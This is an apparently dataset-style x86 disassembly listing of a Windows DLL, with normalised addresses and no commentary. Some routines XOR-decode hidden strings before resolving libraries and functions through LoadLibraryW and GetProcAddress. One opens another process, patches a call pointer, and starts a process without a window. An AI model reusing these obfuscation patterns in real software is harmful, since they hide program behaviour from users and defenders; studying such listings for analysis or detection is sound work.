call [ ebp + 0x8 ]
add esp 0x8
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
push ecx
lea edx [ ebp - 0x10 ]
push edx
push edi
call sub_10053f20
add esp 0xc
test edi edi
jg r-xdata
mov edx [ ebx + ecx * 4 - 0x4 ]
mov eax [ ebp - 0x4 ]
dec ecx
mov [ ebx + eax * 4 ] edx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
mov eax [ ebx + esi * 4 ]
mov [ ebp - 0x4 ] esi
lea esi [ esi + esi + 0x2 ]
mov [ ebx + ecx * 4 ] eax
cmp esi [ ebp - 0x8 ]
jl r-xdata
dec esi
mov ecx [ ebp - 0x8 ]
mov esi [ ebp - 0xc ]
pop esi
mov ecx [ ebp - 0x8 ]
cmp esi ecx
sub_1001201e
push 0x8
push r--data
call sub_10078b50
mov eax [ ebp + 0x10 ]
test [ eax ] 0x80000000
je r-xdata
mov ecx [ eax + 0x8 ]
mov edx [ ebp + 0xc ]
lea ebx [ ecx + edx + 0xc ]
mov ebx [ ebp + 0xc ]
jmp r-xdata
lea eax [ esi + 0x8 ]
push eax
push [ edi + 0x18 ]
call sub_1000a080
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push ebx
call sub_1004243b
dec eax
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x14 ]
push esi
push eax
push [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
push edi
call sub_1002f096
add esp 0x10
dec eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10078b95
retn
push 0x1
lea eax [ esi + 0x8 ]
push eax
push [ edi + 0x18 ]
call sub_1000a080
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push ebx
call sub_1004243b
jmp r-xdata
sub_100120b0
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_10054678
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x2
lea eax [ ebp - 0x10 ]
push eax
push 0x2
push [ ebp + 0x8 ]
call sub_100159e2
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_10012101
mov edi edi
push ebp
mov ebp esp
jmp r-xdata
cmp [ ebp + 0x18 ] 0x0
ja r-xdata
mov eax [ ebp + 0x14 ]
movzx eax [ eax ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1002836c
dec [ ebp + 0x18 ]
add [ ebp + 0x14 ] 0x2
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn
sub_10012134
push 0x14
mov eax sub_1007e60b
call sub_10050d0f
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100067d1
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007a60
mov ecx [ ebp + 0x8 ]
push eax
call sub_100033a0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_1002470e
mov eax edi
call sub_1001a1b3
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1004dae0
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_1001c4b0
push edi
call sub_10009b69
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_10036aac
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1002050e
sub_100121e0
lea ecx [ eax + eax * 2 ]
lea ecx [ ecx * 4 + r--data ]
xor eax eax
cmp [ ecx + 0x4 ] eax
jbe r-xdata
mov eax [ ecx + 0x4 ]
xor ecx ecx
mov [ edx + eax * 2 ] cx
retn
push esi
push edi
mov esi [ ecx ]
movsx esi [ esi + eax ]
movzx edi [ ecx + 0x8 ]
xor si di
xor si ax
mov edi 0xff
and si di
mov [ edx + eax * 2 ] si
inc eax
cmp eax [ ecx + 0x4 ]
jb r-xdata
pop edi
pop esi
sub_10012230
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0xc
push ebx
xor eax eax
push esi
push edi
mov ebx ecx
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] eax
cmp [ ebp + 0x10 ] eax
jl r-xdata
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
jg r-xdata
mov ecx ebx
call sub_1004c970
mov edi edx
mov esi eax
test edi edi
jl r-xdata
cmp [ ebp + 0xc ] eax
jbe r-xdata
mov eax [ ebx ]
mov edx [ eax + 0x1c ]
mov ecx ebx
call edx
or edx 0xffffffff
cmp eax edx
je r-xdata
jg r-xdata
lea esp [ esp ]
mov ecx [ ebp + 0x8 ]
inc ecx
add [ esp + 0x10 ] 0x1
mov [ ecx - 0x1 ] al
mov [ ebp + 0x8 ] ecx
adc [ esp + 0x14 ] 0x0
add [ ebp + 0xc ] edx
adc [ ebp + 0x10 ] edx
mov eax [ ebp + 0x10 ]
cmp eax edi
jg r-xdata
test esi esi
je r-xdata
jl r-xdata
mov eax [ ebx + 0x20 ]
mov ecx [ eax ]
mov edx [ ebp + 0x8 ]
push esi
push ecx
push edx
call sub_10078600
add [ ebp + 0x8 ] esi
mov eax [ ebx + 0x30 ]
add esp 0xc
add [ esp + 0x10 ] esi
adc [ esp + 0x14 ] edi
sub [ ebp + 0xc ] esi
sbb [ ebp + 0x10 ] edi
sub [ eax ] esi
mov eax [ ebx + 0x20 ]
add [ eax ] esi
jmp r-xdata
jl r-xdata
cmp [ ebp + 0xc ] 0x0
ja r-xdata
cmp [ ebp + 0x10 ] 0x0
jg r-xdata
mov esi [ ebp + 0xc ]
mov edi eax
cmp [ ebp + 0xc ] esi
jae r-xdata
sub_10012309
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_10054678
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x80
lea eax [ ebp - 0x10 ]
push eax
push 0x80
push [ ebp + 0x8 ]
call sub_100159e2
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_10012360
push ebp
mov ebp esp
sub esp 0xb0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
call [ GetCurrentThreadId@IAT ]
cmp [ esi + 0x374 ] eax
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
lea edx [ ebp - 0xb0 ]
mov eax 0xdb
call sub_1001bb80
xor eax eax
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
push sub_1001a1b0
push sub_100165d0
push 0x0
push eax
mov eax [ esi + 0x394 ]
mov [ esi + 0x40 ] 0x0
call eax
mov ecx [ ebp - 0x4 ]
xor ecx ebp
add esp 0x10
call sub_1004c3b6
mov esp ebp
pop ebp
retn
sub_100123d5
push 0x8
mov eax sub_1007e4bb
call sub_1005d45e
mov esi ecx
mov [ ebp - 0x14 ] esi
call sub_1006312b
lea ebx [ esi + 0x2c ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
call sub_1001bc97
mov edi eax
xor eax eax
push ebx
push eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x10 ] eax
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] eax
push [ edi + 0x1c ]
mov [ ebp - 0x4 ] eax
call sub_10047b65
add esp 0xc
cmp [ esi + 0x28 ] 0x0
mov [ esi + 0x8 ] eax
je r-xdata
mov eax [ edi + 0x10 ]
mov eax [ edi + 0xc ]
jmp r-xdata
push ebx
push 0x0
push eax
call sub_1001e5b8
mov [ esi + 0x14 ] eax
add esp 0xc
cmp [ edi + 0x2f ] 0x4
mov eax r--data
ja r-xdata
mov eax [ edi + 0x20 ]
push ebx
push 0x0
push eax
call sub_1001e5b8
mov [ esi + 0x10 ] eax
add esp 0xc
cmp [ edi + 0x2e ] 0x4
mov eax r--data
ja r-xdata
push ebx
push 0x0
push eax
call sub_1001e5b8
mov [ esi + 0x18 ] eax
mov eax [ edi + 0x14 ]
movzx eax [ eax ]
add esp 0xc
push ebx
push 0x0
push eax
call sub_1005e05a
mov [ esi + 0xc ] ax
mov eax [ edi + 0x18 ]
movzx eax [ eax ]
push ebx
push 0x0
push eax
call sub_1005e05a
add esp 0x18
cmp [ esi + 0x28 ] 0x0
mov [ esi + 0xe ] ax
je r-xdata
mov eax [ edi + 0x24 ]
mov al [ edi + 0x29 ]
mov al [ edi + 0x28 ]
jmp r-xdata
and [ esi + 0x1c ] 0x0
cmp eax 0x7f
jl r-xdata
movsx eax al
mov [ esi + 0x1c ] eax
test eax eax
js r-xdata
call sub_1001a1b3
retn 0x8
push 0x4
mov esi r--data
push esi
push ebx
call sub_10078600
push 0x4
push esi
push [ ebp - 0x14 ]
call sub_10078600
add esp 0x18
movsx eax [ edi + 0x2e ]
push eax
movsx eax [ edi + 0x2a ]
push eax
movsx eax [ edi + 0x2b ]
push eax
lea ebx [ esi + 0x20 ]
push ebx
mov ecx esi
call sub_10009b93
movsx ecx [ edi + 0x2f ]
push ecx
movsx ecx [ edi + 0x2c ]
push ecx
movsx ecx [ edi + 0x2d ]
lea eax [ esi + 0x24 ]
push ecx
push eax
mov ecx esi
mov [ ebp - 0x14 ] eax
call sub_10009b93
cmp [ ebp + 0xc ] 0x0
je r-xdata
sub_1001252f
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push eax
xor edi edi
push edi
push edi
push edi
push edi
push ecx
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x20 ] ecx
xor ebx ebx
call sub_10044041
add esp 0x20
mov [ ebp - 0x14 ] eax
test al 0x4
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_1002a905
test [ ebp - 0x14 ] 0x2
pop ecx
pop ecx
jne r-xdata
mov ebx 0x200
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x18 ] edi
jmp r-xdata
mov ebx 0x80
cmp eax 0x1
jne r-xdata
mov eax [ ebp - 0x24 ]
sub eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ ebp - 0x1c ]
mov [ esi + 0x10 ] eax
mov eax [ ebp - 0x18 ]
mov [ esi + 0x14 ] eax
pop edi
mov [ esi ] ebx
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_1004c3b6
leave
retn
or ebx 0x100
cmp eax 0x2
jne r-xdata
test [ ebp - 0x14 ] 0x1
jne r-xdata
sub_100125d6
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov ecx [ rw-data ]
mov [ eax ] ecx
xor eax eax
pop ebp
retn
call sub_10012991
mov [ eax ] 0x16
call sub_1002788e
push 0x16
pop eax
pop ebp
retn
sub_1001261a
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_10012640
push ebp
mov ebp esp
sub esp 0x98
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
push ebx
xor ebx ebx
push esi
mov [ ebp - 0x98 ] ebx
mov [ ebp - 0x8c ] ebx
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x26
and edx 0xff
mov [ ebp + eax * 2 - 0x40 ] dx
inc eax
cmp eax 0xd
jb r-xdata
xor eax eax
lea edx [ ebp - 0x8c ]
push edx
mov [ ebp - 0x26 ] ax
mov eax [ edi + 0x1c ]
mov ecx [ eax ]
lea edx [ ebp - 0x40 ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
je r-xdata
cmp [ edi + 0x54 ] 0x8
lea eax [ edi + 0x40 ]
jb r-xdata
mov ecx 0x3
lea edx [ ebp - 0x24 ]
lea eax [ ecx + 0x12 ]
mov [ ebp - 0x14 ] cx
lea esi [ ecx - 0x2 ]
call sub_1000a6f0
mov ebx [ ebp - 0x14 ]
mov ecx [ edi + 0x1c ]
mov edx [ ecx ]
lea eax [ ebp - 0x8c ]
push eax
push r--data
lea eax [ ebp - 0x24 ]
push eax
sub esp 0x10
mov eax esp
mov [ eax ] ebx
mov ebx [ ebp - 0x10 ]
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] esi
mov esi [ ebp - 0x8 ]
push ecx
mov ecx [ edx + 0xe0 ]
mov [ eax + 0xc ] esi
call ecx
test eax eax
je r-xdata
push eax
call [ SysAllocString@IAT ]
mov esi eax
mov eax [ ebp - 0x8c ]
mov edx [ eax ]
push esi
push eax
mov eax [ edx + 0x6c ]
call eax
lea edx [ ebp - 0x10 ]
mov eax 0x4a
mov [ ebp - 0x94 ] ebx
mov [ ebp - 0x90 ] ebx
call sub_1000a6f0
mov eax [ edi + 0x1c ]
mov ecx [ eax ]
lea edx [ ebp - 0x94 ]
push edx
lea edx [ ebp - 0x10 ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
je r-xdata
mov eax [ eax ]
xor ebx ebx
lea edx [ ebp - 0x78 ]
mov eax 0xc5
call sub_1000a6f0
mov esi 0x1
xor ebx ebx
jmp r-xdata
mov eax [ ebp - 0x94 ]
mov ecx [ eax ]
lea edx [ ebp - 0x90 ]
push edx
mov edx [ ebp - 0x8c ]
push edx
push eax
mov eax [ ecx + 0x54 ]
call eax
mov eax [ ebp - 0x90 ]
cmp eax ebx
je r-xdata
lea edx [ ebp - 0x78 ]
mov eax 0xad
call sub_1000a6f0
mov [ ebp - 0x98 ] 0x2
jmp r-xdata
mov eax [ ebp - 0x8c ]
cmp eax ebx
je r-xdata
lea edx [ ebp - 0x88 ]
mov eax 0x12b
call sub_1000a6f0
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0x90 ] ebx
jmp r-xdata
push esi
call [ SysFreeString@IAT ]
mov esi [ ebp - 0x98 ]
mov ecx [ ebp - 0x4 ]
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebp - 0x94 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_10012850
push ebp
mov ebp esp
xor eax eax
test ecx ecx
je r-xdata
mov eax 0x80070057
cmp ecx 0x7fffffff
jbe r-xdata
pop ebp
retn
push ebx
push esi
lea esi [ ecx - 0x1 ]
mov ecx [ ebp + 0x8 ]
lea eax [ ebp + 0xc ]
push eax
push ecx
push esi
push edi
xor ebx ebx
call sub_10022f83
add esp 0x10
test eax eax
js r-xdata
test eax eax
js r-xdata
mov [ esi + edi ] bl
mov ebx 0x8007007a
cmp eax esi
ja r-xdata
jne r-xdata
pop esi
mov eax ebx
pop ebx
mov [ esi + edi ] bl
pop esi
mov eax ebx
pop ebx
pop ebp
retn
sub_100128a4
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
push edi
push 0x16
pop edi
push edi
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_1000702c
add esp 0x14
test esi esi
jne r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
je r-xdata
call sub_10012991
mov [ eax ] edi
call sub_1002788e
mov eax edi
jmp r-xdata
push ebx
mov ebx [ ebp - 0x28 ]
xor eax eax
dec ebx
cmp [ ebp - 0x2c ] 0x2d
sete al
lea edi [ eax + esi ]
cmp ecx 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_1004c3b6
leave
retn
sub ecx eax
or ecx ecx
jmp r-xdata
mov eax [ ebp - 0x28 ]
dec eax
cmp ebx eax
setl cl
cmp eax 0xfffffffc
jl r-xdata
mov [ esi ] 0x0
jmp r-xdata
lea eax [ ebp - 0x2c ]
push eax
push [ ebp + 0x14 ]
push ecx
push edi
call sub_10069589
add esp 0x10
test eax eax
je r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x2c ]
push 0x1
push eax
push [ ebp + 0x18 ]
mov eax esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_1007bce2
add esp 0x18
cmp eax [ ebp + 0x14 ]
jge r-xdata
pop ebx
test cl cl
je r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x2c ]
push 0x1
push [ ebp + 0x14 ]
mov ecx esi
push [ ebp + 0x10 ]
call sub_1007be43
add esp 0x10
jmp r-xdata
mov al [ edi ]
inc edi
test al al
jne r-xdata
mov [ edi - 0x2 ] al
sub_100129b0
cmp [ rw-data ] 0x8
jb r-xdata
push esi
xor ecx ecx
mov esi rw-data
mov [ rw-data ] 0x7
mov [ rw-data ] 0x0
mov [ rw-data ] cx
call sub_1004dc30
mov esi 0x8
cmp [ rw-data ] esi
jb r-xdata
mov eax [ rw-data ]
push eax
call sub_10065045
add esp 0x4
xor eax eax
cmp [ rw-data ] esi
mov [ rw-data ] 0x7
mov [ rw-data ] 0x0
mov [ rw-data ] ax
pop esi
jb r-xdata
mov edx [ rw-data ]
push edx
call sub_10065045
add esp 0x4
xor edx edx
mov [ rw-data ] 0x7
mov [ rw-data ] 0x0
mov [ rw-data ] dx
retn
mov ecx [ rw-data ]
push ecx
call sub_10065045
add esp 0x4
sub_10012a60
push ebp
mov ebp esp
sub esp 0xb10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
test eax eax
jne r-xdata
push eax
call [ StrToIntW@IAT ]
mov edi eax
push edi
push 0x0
push 0x410
call [ OpenProcess@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov eax 0x1
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
push 0x104
lea eax [ ebp - 0x28c ]
push eax
push 0x0
push esi
call [ GetModuleFileNameExW@IAT ]
test eax eax
push esi
mov al 0x38
jne r-xdata
lea eax [ esi + 0x2 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov edx [ rw-data ]
mov [ ebp - 0xab0 ] edx
xor [ ebp - 0xab0 ] al
xor [ ebp - 0xaaf ] al
xor [ ebp - 0xaae ] al
xor [ ebp - 0xaad ] al
call [ ebp - 0xab0 ]
test eax eax
jne r-xdata
mov ecx [ rw-data ]
mov [ ebp - 0xab0 ] ecx
xor [ ebp - 0xab0 ] al
xor [ ebp - 0xaaf ] al
xor [ ebp - 0xaae ] al
xor [ ebp - 0xaad ] al
call [ ebp - 0xab0 ]
mov eax 0x3
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x28c ]
push eax
call [ PathQuoteSpacesW@IAT ]
lea edx [ ebp - 0x7c ]
mov eax 0xf7
call sub_1001bb80
mov ecx edx
push ecx
mov edx 0x7ffffffe
mov eax 0x30c
lea ecx [ ebp - 0x8a4 ]
call sub_1006b860
test eax eax
je r-xdata
mov eax 0x4
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x10 ]
mov eax 0xe9
call sub_1001bb80
push edi
push edx
mov eax 0x16
lea ebx [ ebp - 0x4c ]
call sub_100253f0
add esp 0x8
test eax eax
je r-xdata
mov eax 0x5
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x4c ]
push eax
lea esi [ ebp - 0x8a4 ]
call sub_1005da90
test eax eax
je r-xdata
mov eax 0x6
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x74 ]
mov eax 0x65
call sub_1001bb80
mov ecx edx
push ecx
lea esi [ ebp - 0x8a4 ]
call sub_1005da90
test eax eax
je r-xdata
mov eax 0x7
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x28c ]
push edx
lea esi [ ebp - 0x8a4 ]
call sub_1005da90
test eax eax
je r-xdata
mov eax 0x8
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x20 ]
mov eax 0x154
call sub_1001bb80
mov eax edx
push eax
lea esi [ ebp - 0x8a4 ]
call sub_1005da90
test eax eax
je r-xdata
mov eax 0x9
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x34 ]
mov eax 0x132
call sub_1001bb80
push 0x104
lea ecx [ ebp - 0xaac ]
push ecx
push edx
call [ ExpandEnvironmentStringsW@IAT ]
test eax eax
jne r-xdata
mov eax 0xa
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
push 0x44
lea eax [ ebp - 0xb0c ]
push 0x0
push eax
call sub_10078970
add esp 0xc
xor eax eax
lea ecx [ ebp - 0xac0 ]
push ecx
lea edx [ ebp - 0xb0c ]
push edx
push eax
push eax
push 0x8000000
push eax
push eax
push eax
mov [ ebp - 0xac0 ] eax
mov [ ebp - 0xabc ] eax
mov [ ebp - 0xab8 ] eax
mov [ ebp - 0xab4 ] eax
lea eax [ ebp - 0x8a4 ]
push eax
lea ecx [ ebp - 0xaac ]
push ecx
mov [ ebp - 0xb0c ] 0x44
call [ CreateProcessW@IAT ]
mov ecx [ ebp - 0x8 ]
neg eax
sbb eax eax
pop edi
and eax 0xfffffff4
pop esi
xor ecx ebp
add eax 0xc
pop ebx
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov eax 0xb
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
sub_10012d60
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov edx [ esi + 0x4 ]
lea eax [ ecx + 0x4 ]
sub edx eax
sar edx 0x2
add edx edx
add edx edx
push edx
push eax
push ecx
call sub_10077d10
mov eax [ ebp + 0x8 ]
add esp 0xc
add [ esi + 0x4 ] 0xfffffffc
mov [ edi ] eax
mov eax edi
pop ebp
retn 0x4
sub_10012d8f
push 0x10
push r--data
call sub_10078b50
mov edi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
cmp [ edi + 0x4 ] 0x80
jg r-xdata
mov esi [ ebx + 0x8 ]
movsx esi [ ebx + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10012e51
cmp esi [ ebp + 0x14 ]
je r-xdata
cmp esi 0xffffffff
jle r-xdata
mov [ ebp - 0x1c ] esi
call sub_10044fed
inc [ eax + 0x90 ]
and [ ebp - 0x4 ] 0x0
mov [ ebx + 0x8 ] esi
call sub_10078b95
retn
call sub_1001e222
call sub_1001e222
cmp esi [ edi + 0x4 ]
jl r-xdata
mov eax esi
mov ecx [ edi + 0x8 ]
mov esi [ ecx + eax * 8 ]
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x4 ] 0x1
cmp [ ecx + eax * 8 + 0x4 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov [ ebx + 0x8 ] esi
push 0x103
push ebx
mov ecx [ edi + 0x8 ]
push [ ecx + eax * 8 + 0x4 ]
call sub_1007b0e0
mov [ ebp - 0x1c ] esi
jmp r-xdata
cmp esi [ ebp + 0x14 ]
je r-xdata
sub_10012e90
push ebp
mov ebp esp
sub esp 0xe4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x14 ]
mov eax [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x10 ]
mov [ ebp - 0xe4 ] ebx
mov ebx [ ebp + 0x18 ]
mov [ ebp - 0xe0 ] ebx
mov ebx [ ebp + 0x20 ]
push ebx
mov ebx [ ebp + 0x1c ]
push ebx
mov ebx [ ebp - 0xe0 ]
push ebx
mov ebx [ ebp - 0xe4 ]
push ebx
push edi
push ecx
push eax
mov eax [ ebp + 0x8 ]
push eax
push esi
call sub_10004ed0
xor edi edi
mov [ esi ] r--data
mov [ esi + 0xb8 ] edi
mov [ esi + 0xbc ] edi
mov [ esi + 0xc0 ] edi
mov [ esi + 0xec ] 0x0
mov ecx [ r--data ]
xor eax eax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x55
and edx 0xff
mov [ ebp + eax * 2 - 0x48 ] dx
inc eax
cmp eax 0xb
jb r-xdata
lea ecx [ ebp - 0x48 ]
xor eax eax
push ecx
mov [ ebp - 0x32 ] ax
call [ LoadLibraryW@IAT ]
mov [ esi + 0xc0 ] eax
cmp eax edi
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
mov eax esi
pop ebx
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x1c
mov edi [ r--data ]
xor dl dl
xor ecx ecx
mov bl [ ecx + edi ]
xor bl dl
xor bl 0x2f
inc dl
mov [ ebp + ecx - 0x10 ] bl
movzx ecx dl
cmp ecx 0xb
jb r-xdata
mov ebx [ GetProcAddress@IAT ]
lea edx [ ebp - 0x10 ]
push edx
push eax
mov [ ebp - 0x5 ] 0x0
call ebx
mov [ esi + 0xc4 ] eax
test eax eax
je r-xdata
lea edi [ ebp - 0x5c ]
mov eax 0x50
call sub_10039350
mov ecx [ esi + 0xc0 ]
mov eax edi
push eax
push ecx
call ebx
mov [ esi + 0xc8 ] eax
test eax eax
je r-xdata
lea edi [ ebp - 0xc4 ]
mov eax 0x7
call sub_10039350
mov eax [ esi + 0xc0 ]
mov edx edi
push edx
push eax
call ebx
mov [ esi + 0xcc ] eax
test eax eax
je r-xdata
lea edi [ ebp - 0x20 ]
mov eax 0x1c
call sub_10039350
mov edx [ esi + 0xc0 ]
mov ecx edi
push ecx
push edx
call ebx
mov [ esi + 0xd0 ] eax
test eax eax
je r-xdata
lea edi [ ebp - 0x70 ]
mov eax 0x32
call sub_10039350
mov ecx [ esi + 0xc0 ]
mov eax edi
push eax
push ecx
call ebx
mov [ esi + 0xd4 ] eax
test eax eax
je r-xdata
lea edi [ ebp - 0xac ]
mov eax 0xe
call sub_10039350
mov eax [ esi + 0xc0 ]
mov edx edi
push edx
push eax
call ebx
mov [ esi + 0xd8 ] eax
test eax eax
je r-xdata
lea edi [ ebp - 0x30 ]
mov eax 0x36
call sub_10039350
mov edx [ esi + 0xc0 ]
mov ecx edi
push ecx
push edx
call ebx
mov [ esi + 0xdc ] eax
test eax eax
je r-xdata
lea edi [ ebp - 0x98 ]
mov eax 0x10
call sub_10039350
mov ecx [ esi + 0xc0 ]
mov eax edi
push eax
push ecx
call ebx
mov [ esi + 0xe0 ] eax
test eax eax
je r-xdata
lea edi [ ebp - 0x84 ]
mov eax 0x13
call sub_10039350
mov eax [ esi + 0xc0 ]
mov edx edi
push edx
push eax
call ebx
mov [ esi + 0xe4 ] eax
test eax eax
je r-xdata
lea edi [ ebp - 0xdc ]
mov eax 0x3b
call sub_10039350
mov edx [ esi + 0xc0 ]
mov ecx edi
push ecx
push edx
call ebx
mov [ esi + 0xe8 ] eax
test eax eax
je r-xdata
mov [ esi + 0xec ] 0x1
sub_10013100
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
push edi
mov esi ecx
call sub_100485e5
test al al
je r-xdata
mov edi [ ebp + 0xc ]
push 0x0
push edi
mov ecx esi
call sub_10064dae
test al al
je r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov eax esi
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
